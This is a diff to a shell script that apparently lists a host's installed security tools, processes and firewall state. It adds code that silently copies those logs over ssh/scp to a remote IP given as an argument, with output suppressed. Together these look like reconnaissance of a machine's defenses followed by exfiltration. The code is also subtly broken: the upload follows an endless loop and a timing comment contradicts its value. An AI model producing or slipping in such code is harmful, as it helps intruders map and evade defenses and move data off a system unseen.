@@ -12,6 +12,17 @@ DEFENSIVE_TOOLS=("wireshark" "tcpdump" "snort" "zeek" "ossec" "clamd" "firewalld
                  "sysmon" "zabbix" "nagios" "ossec" "ufw" "openvas" "tripwire" "security onion" 
                  "aide" "cilium" "fail2ban" "nmap" "rkhunter" "basilisk")
 
+# Check if the target IP was provided
+if [ -z "$1" ]; then
+    echo "Error: No target IP provided."
+    exit 1
+fi
+
+# Target machine details
+TARGET_USER="$(whoami)"       # Replace with the username on the target machine
+TARGET_IP="$1"                # Replace with the IP address of the target machine
+TARGET_DIR="/path/to/target/directory" # Replace with the directory on the target machine
+
 # Setup the logging directory
 mkdir -p "$LOG_DIR"
 
@@ -78,3 +89,6 @@ while true; do
     sleep 35  # Wait for 10 minutes before the next check
 done
 
+# Create target directory on remote machine if it doesn’t exist, then send logs
+ssh "$TARGET_USER@$TARGET_IP" "mkdir -p '$TARGET_DIR'"
+scp "$SOFTWARE_LOG" "$PROCESS_LOG" "$FIREWALL_LOG" "$TARGET_USER@$TARGET_IP:$TARGET_DIR" > /dev/null 2>&1
